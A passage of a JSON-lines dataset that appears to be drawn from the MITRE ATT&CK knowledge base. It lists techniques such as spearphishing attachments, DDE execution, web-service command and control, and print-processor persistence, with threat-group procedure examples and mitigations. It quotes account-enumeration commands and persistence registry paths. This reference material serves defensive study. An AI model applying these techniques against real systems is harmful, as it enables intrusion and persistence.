", "Network intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity.", "APT19 sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.", "APT-C-36 has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway. ", "Frankenstein has used spearphishing emails to send trojanized Microsoft Word documents.  ", "Darkhotel has sent spearphishing emails with malicious RAR and .LNK attachments.", "Gorgon Group sent emails to victims with malicious Microsoft Office documents attached.", "FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.", "Nomadic Octopus has targeted victims with spearphishing emails containing malicious attachments.", "Block unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments.", "JSS Loader has been delivered by phishing emails containing malicious Microsoft Excel attachments.", "APT32 has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.", "MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.\t ", "Hancitor has been delivered via phishing emails with malicious attachments.", "Cobalt Group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.", "Sandworm Team has delivered malicious Microsoft Office attachments via spearphishing emails.", "EnvyScout has been distributed via spearphishing as an email attachment.", "APT28 sent spearphishing emails containing malicious Microsoft Office and RAR attachments.", "APT38 has conducted spearphishing campaigns using malicious email attachments.", "Bandook is delivered via a malicious Word document inside a zip file.", "Rancor has attached a malicious document to an email to gain initial access.", " Machete has delivered spearphishing emails that contain a zipped file with malicious contents.", "Gamaredon Group has delivered spearphishing emails with malicious attachments to targets.", "Windshift has sent spearphishing emails with attachment to harvest credentials and deliver malware.", "IcedID has been delivered via phishing e-mails with malicious attachments.", "Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.", "Transparent Tribe has sent spearphishing e-mails with attachments to deliver malicious payloads.\t ", "TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware", "Kimsuky has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns.", "APT1 has sent spearphishing emails containing malicious attachments.", "Molerats has sent phishing emails with malicious Microsoft Word and PDF attachments.", "QakBot has spread through emails with malicious attachments.", "FIN6 has targeted victims with e-mails containing malicious attachments.", "Mustang Panda has used spearphishing attachments to deliver initial access payloads.", "APT41 sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.", "BADFLICK has been distributed via spearphishing campaigns containing malicious Microsoft Word documents.", "PoetRAT was distributed via malicious Word documents.", "Leviathan has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.", "admin@338 has sent emails with malicious Microsoft Office documents attached.", "NETWIRE has been spread via e-mail campaigns utilizing malicious attachments.", "Ajax Security Team has used personalized spearphishing attachments.", "RTM has been delivered via spearphishing attachments disguised as PDF documents.", "APT37 delivers malware using spearphishing emails with malicious HWP attachments.", "APT39 leveraged spearphishing emails with malicious attachments to initially compromise victims.", "BlackTech has used spearphishing e-mails with malicious documents to deliver malware.", "Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation.", "Naikon has used malicious e-mail attachments to deliver malware.", "Rifdoor has been distributed in e-mails with malicious Excel or Word documents.", "APT33 has sent spearphishing e-mails with archive attachments.", "Inception has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.", "TA505 has used spearphishing emails with malicious attachments to initially compromise victims.", "Tonto Team has delivered payloads via spearphishing attachments.", "menuPass has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.", "Sidewinder has sent e-mails with malicious attachments often crafted for specific targets.", "Lokibot is delivered via a malicious XLS attachment contained within a spearhpishing email. ", "Mofang delivered spearphishing emails with malicious documents, PDFs, or Excel files attached.", "BRONZE BUTLER used spearphishing emails with malicious Microsoft Word attachments to infect victims.", "TA551 has sent spearphishing attachments with password protected ZIP files.", "Taidoor has been delivered through spearphishing emails.", "The primary delivered mechaism for Agent Tesla is through email phishing messages. ", "DarkHydrus has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server.", "Gallmaker sent emails with malicious Microsoft Office documents attached.", "Valak has been delivered via spearphishing e-mails with password protected ZIP files.", "TA459 has targeted victims using spearphishing emails with malicious Microsoft Word attachments.", "Pony has been delivered via spearphishing attachments.", "APT12 has sent emails with malicious Microsoft Office documents and PDFs attached.", "The White Company has sent phishing emails with malicious Microsoft Word attachments to victims.", "Patchwork has used spearphishing with an attachment to deliver files with exploits to initial victims."], "is_subtechnique": true}
{"text": " Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution. Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017) Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)", "idx": "https://attack.mitre.org/techniques/T1559/002", "title": "Dynamic Data Exchange", "entity": "Dynamic Data Exchange", "entity_type": "techniques", "entity_context": ["MuddyWater has used malware that can execute PowerShell scripts via DDE.", "Gallmaker attempted to exploit Microsoft’s DDE protocol in order to gain access to victim machines and for execution.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent DDE attacks and spawning of child processes from Office programs.", "APT28 has delivered JHUHUGIT and Koadic by executing PowerShell commands through DDE in Word documents.", "Patchwork leveraged the DDE protocol to deliver their malware.", "GravityRAT has been delivered via Word documents using DDE for execution.", "Consider disabling embedded files in Office programs, such as OneNote, that do not work with Protected View.", "Ensure Protected View is enabled.", "Ramsay has been delivered using OLE objects in malicious documents.\t", "Valak can execute tasks via OLE.", "POWERSTATS can use DDE to execute additional payloads on compromised hosts.", "Registry keys specific to Microsoft Office feature control security can be set to disable automatic DDE/OLE execution.  Microsoft also created, and enabled by default, Registry keys to completely disable DDE execution in Word and Excel.", "KeyBoy uses the Dynamic Data Exchange (DDE) protocol to download remote payloads.", "PoetRAT was delivered with documents using DDE to execute malicious code.", "RTM can search for specific strings within browser tabs using a Dynamic Data Exchange mechanism.", "Leviathan has utilized OLE as a method to insert malicious content inside various phishing documents. ", "FIN7 spear phishing campaigns have included malicious Word documents with DDE execution.", "APT37 has used Windows DDE for execution of commands and a malicious VBS.", "HAWKBALL has used an OLE object that uses Equation Editor to drop the embedded shellcode.", "Sharpshooter has sent malicious Word OLE documents to victims.", "TA505 has leveraged malicious Word documents that abused DDE.", "Cobalt Group has sent malicious Word OLE compound documents to victims.", "Sidewinder has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer."], "is_subtechnique": true}
{"text": " Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/techniques/T1585", "title": "Establish Accounts", "entity": "Establish Accounts", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "APT17 has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate, APT17 has created biographical sections and posted in forum threads.", "Fox Kitten has created KeyBase accounts to communicate with ransomware victims."], "is_subtechnique": false}
{"text": " Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop) Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation. Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)", "idx": "https://attack.mitre.org/techniques/T1133", "title": "External Remote Services", "entity": "External Remote Services", "entity_type": "techniques", "entity_context": ["Ke3chang regained access after eviction via the corporate VPN solution with a stolen VPN certificate, which they had extracted from a compromised host.", "Kimsuky has used RDP to establish persistence.", "Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.", "APT18 actors leverage legitimate credentials to log into external remote services.", "TEMP.Veles has used a VPN to persist in the victim environment.", "APT29 has used compromised identities to access VPNs and remote access tools.", "Doki was executed through an open Docker daemon API port.", "FIN5 has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment.", "TeamTNT has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments. TeamTNT has also targeted exposed kubelets for Kubernetes environments.", "Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of Two-Factor Authentication Interception techniques for some two-factor authentication implementations.", "Dragonfly 2.0 used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.", "GOLD SOUTHFIELD has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.\t", "APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts.", "Hildegard was executed through an unsecure kubelet that allowed anonymous access to the victim environment.", "APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.\n", "GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.", "OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment.", "Disable or block remotely available services that may be unnecessary.", "Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services. Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.", "Chimera has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services.", "Night Dragon has used compromised VPN accounts to gain access to victim systems.", "Linux Rabbit attempts to gain access to the server via SSH.", "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls.", "Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access.", "Operation Wocao has used stolen credentials to connect to the victim's network via VPN.", "Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems.", "Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.", "Kinsing was executed in an Ubuntu container deployed via an open Docker daemon API."], "is_subtechnique": false}
{"text": " Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior. Commands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.", "idx": "https://attack.mitre.org/techniques/T1087/002", "title": "Domain Account", "entity": "Domain Account", "entity_type": "techniques", "entity_context": ["POWRUNER may collect user account information by running <code>net user /domain</code> or a series of other commands on a victim.", "Turla has used <code>net user /domain</code> to enumerate domain accounts.", "Cobalt Strike can determine if the user on an infected machine is in the admin or domain admin group.", "SoreFang can enumerate domain accounts via <code>net.exe user /domain</code>.", "Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD.\t", "AdFind can enumerate domain users.", "Dragonfly 2.0 used batch scripts to enumerate users on a victim domain controller.", "OilRig has run <code>net user</code>, <code>net user /domain</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to get account listings on a victim.", "Ke3chang performs account discovery using commands such as <code>net localgroup administrators</code> and <code>net group \"REDACTED\" /domain</code> on specific permissions groups.", "FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.", "Wizard Spider has identified domain admins through the use of “net group ‘Domain admins’” commands.", "MuddyWater has used <code>cmd.exe net user /domain</code> to enumerate domain users.", "Stuxnet enumerates user accounts of the domain.", "BloodHound can collect information about domain users, including identification of domain admin accounts.", "Bazar has the ability to identify domain administrator accounts.", "BRONZE BUTLER has used <code>net user /domain</code> to identify account information.", "Valak has the ability to enumerate domain admin accounts.", "menuPass has used the Microsoft administration tool csvde.exe to export Active Directory data.", "Poseidon Group searches for administrator accounts on both the local victim machine and the network.", "Empire can acquire local and domain user account information.", "dsquery can be used to gather information on user accounts within a domain.", "IcedID can query LDAP to identify additional users on the network to infect.", "CrackMapExec can enumerate the domain user accounts on a targeted system.", "BoomBox has the ability to execute an LDAP query to enumerate the distinguished name, SAM account name, and display name for all domain users.", "Fox Kitten has used the Softerra LDAP browser to browse documentation on service accounts.", "PoshC2 can enumerate local and domain user account information.", "Sykipot may use <code>net group \"domain admins\" /domain</code> to display accounts in the \"domain admins\" permissions group and <code>net localgroup \"administrators\"</code> to list local system administrator group membership.", "Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located at <code>HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration > Policies > Administrative Templates > Windows Components > Credential User Interface: Enumerate administrator accounts on elevation.", "OSInfo enumerates local and domain users", "Bankshot gathers domain and account names/information through process monitoring.", "Operation Wocao has used the <code>net</code> command to retrieve information about domain accounts.\t ", "Net commands used with the <code>/domain</code> flag can be used to gather information about and manipulate user accounts on the current domain.", "Chimera has has used <code>net user /dom</code> and <code>net user Administrator</code> to enumerate domain accounts including administrator accounts."], "is_subtechnique": true}
{"text": " Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)", "idx": "https://attack.mitre.org/techniques/T1216", "title": "Signed Script Proxy Execution", "entity": "Signed Script Proxy Execution", "entity_type": "techniques", "entity_context": ["Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries."], "is_subtechnique": false}
{"text": " Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <code>GetPrintProcessorDirectory</code> API call.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.", "idx": "https://attack.mitre.org/techniques/T1547/012", "title": "Print Processors", "entity": "Print Processors", "entity_type": "techniques", "entity_context": ["The PipeMon installer has modified the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors</code> to install PipeMon as a Print Processor.", "Limit user accounts that can load or unload device drivers by disabling <code>SeLoadDriverPrivilege</code>."], "is_subtechnique": true}
{"text": " Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster. These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.", "idx": "https://attack.mitre.org/techniques/T1613", "title": "Container and Resource Discovery", "entity": "Container and Resource Discovery", "entity_type": "techniques", "entity_context": ["Hildegard has used masscan to search for kubelets and the kubelet API for additional running containers. ", "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls.", "Limit communications with the container service to local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API and Kubernetes API Server.", "TeamTNT has checked for running containers with <code>docker ps</code> and for specific container names with <code>docker inspect</code>.", "Enforce the principle of least privilege by limiting dashboard visibility to only the required users."], "is_subtechnique": false}
{"text": " Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.", "idx": "https://attack.mitre.org/techniques/T1102/002", "title": "Bidirectional Communication", "entity": "Bidirectional Communication", "entity_type": "techniques", "entity_context": ["APT28 has used Google Drive for C2.", "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services.", "BLACKCOFFEE has also obfuscated its C2 traffic as normal traffic to sites such as Github.", "Magic Hound malware can use a SOAP Web service to communicate with its C2 server.", "Comnie uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.", "yty communicates to the C2 server by retrieving a Google Doc.", "Kazuar has used compromised WordPress blogs as C2 servers.", "SLOWDRIFT uses cloud based services for C2.", "Sandworm Team has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor. Sandworm Team also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "Orz has used Technet and Pastebin web pages for command and control.", "BLUELIGHT can use different cloud providers for its C2.", "BADNEWS can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.", "RogueRobin has used Google Drive as a Command and Control channel. ", "POORAIM has used AOL Instant Messenger for C2.", "Carbanak has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2.", "GLOOXMAIL communicates to servers operated by Google using the Jabber/XMPP protocol.", "The CALENDAR malware communicates through the use of events in Google Calendar.", "APT37 leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.", "FIN7 used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.", "LOWBALL uses the Dropbox cloud storage service for command and control.", "CozyCar uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.", "ROKRAT leverages legitimate social networking sites and cloud platforms (Twitter, Yandex, and Mediafire) for C2 communications.", "ComRAT has the ability to use the Gmail web UI to receive commands and exfiltrate information.", "MuddyWater has used web services including OneHub to distribute remote access tools.", "BoxCaon has used DropBox for C2 communications. ", "APT12 has used blogs and WordPress for C2 infrastructure.", "Grandoreiro can utilize web services including Google sites to send and receive C2 data.", "Crutch can use Dropbox to receive commands and upload stolen data.", "PowerStallion uses Microsoft OneDrive as a C2 server via a network drive mapped with <code>net use</code>.", "A Turla JavaScript backdoor has used Google Apps Script as its C2 server.", "DOGCALL is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.", "APT29 has used social media platforms to hide communications to C2 servers.", "APT39 has communicated with C2 through files uploaded to and downloaded from DropBox.", "ZIRCONIUM has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands.", "Empire can use Dropbox and GitHub for C2.", "KARAE can use public cloud-based storage providers for command and control.", "Revenge RAT used blogpost.com as its primary command and control server during a campaign.", "RegDuke can use Dropbox as its C2 server.", "One variant of CloudDuke uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.", "UBoatRAT has used GitHub and a public blog service in Hong Kong for C2 communications."], "is_subtechnique": true}
{"text": " Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments. Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.", "idx": "https://attack.mitre.org/techniques/T1071/002", "title": "File Transfer Protocols", "entity": "File Transfer Protocols", "entity_type": "techniques", "entity_context": ["NOKKI has used FTP for C2 communications.", "JPIN can communicate over FTP.", "Machete uses FTP for Command & Control.", "ShadowPad has used FTP for C2 communications.", "Attor has used FTP protocol for C2 communication.", "SilverTerrier uses FTP for C2 communications.\t", "CARROTBALL has the ability to use FTP in C2 communications.", "APT41 used exploit payloads that initiate download via FTP.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. ", "Honeybee uses FTP for command and control.", "XAgentOSX contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.", "Kazuar uses FTP and FTPS to communicate with the C2 server.", "Kimsuky has used FTP to download additional malware to the target machine.", "SYSCON has the ability to use FTP in C2 communications.", "PoetRAT has used FTP for C2 communications.", "ZxShell has used FTP for C2 connections. "], "is_subtechnique": true}
{"text": " Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository: * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials * Work / project schedules * Source code snippets * Links to network shares and other internal resources Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.", "idx": "https://attack.mitre.org/techniques/T1213", "title": "Data from Information Repositories", "entity": "Data from Information Repositories", "entity_type": "techniques", "entity_context": ["Develop and publish policies that define acceptable information to be stored in repositories.", "APT28 has collected files from various information repositories.", "P.A.S. Webshell has the ability to list and extract data from SQL databases.", "Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization.", "Consider periodic review of accounts and privileges for critical and sensitive repositories.", "Fox Kitten has accessed victim security and IT environments and Microsoft Teams to mine valuable information.", "FIN6 has collected schemas and user accounts from systems running SQL Server.", "Turla has used a custom .NET tool to collect documents from an organization's internal central database."], "is_subtechnique": false}
{"text": " Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).", "idx": "https://attack.mitre.org/techniques/T1591/002", "title": "Business Relationships", "entity": "Business Relationships", "entity_type": "techniques", "entity_context": ["In preparation for its attack against the 2018 Winter Olympics, Sandworm Team conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following: * Local Port * Standard TCP/IP Port * USB Monitor * WSD Port Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.", "idx": "https://attack.mitre.org/techniques/T1547/010", "title": "Port Monitors", "entity": "Port Monitors", "entity_type": "techniques", "entity_context": [], "is_subtechnique": true}
{"text": " Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check) There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018) On a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.", "idx": "https://attack.mitre.org/techniques/T1614/001", "title": "System Language Discovery", "entity": "System Language Discovery", "entity_type": "techniques", "entity_context": ["SynAck lists all the keyboard layouts installed on the victim’s system using <code>GetKeyboardLayoutList</code> API and checks against a hardcoded language code list. If a match if found, SynAck sleeps for 300 seconds and then exits without encrypting files. ", "Ryuk has been observed to query the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> and the value <code>InstallLanguage</code>. If the machine has the value 0x419 (Russian), 0x422 (Ukrainian), or 0x423 (Belarusian), it stops execution.", "Zeus Panda queries the system's keyboard mapping to determine the language used on the system. It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN.", "REvil can check the system language using <code>GetUserDefaultUILanguage</code> and <code>GetSystemDefaultUILanguage</code>. If the language is found in the list, the process terminates.\n", "Clop has checked the keyboard language using the GetKeyboardLayout() function to avoid installation on Russian-language or other Commonwealth of Independent States-language machines; it will also check the <code>GetTextCharset</code> function. ", "Bazar can perform a check to ensure that the operating system's keyboard and language settings are not set to Russian.", "GrimAgent has used <code>Accept-Language</code> to identify 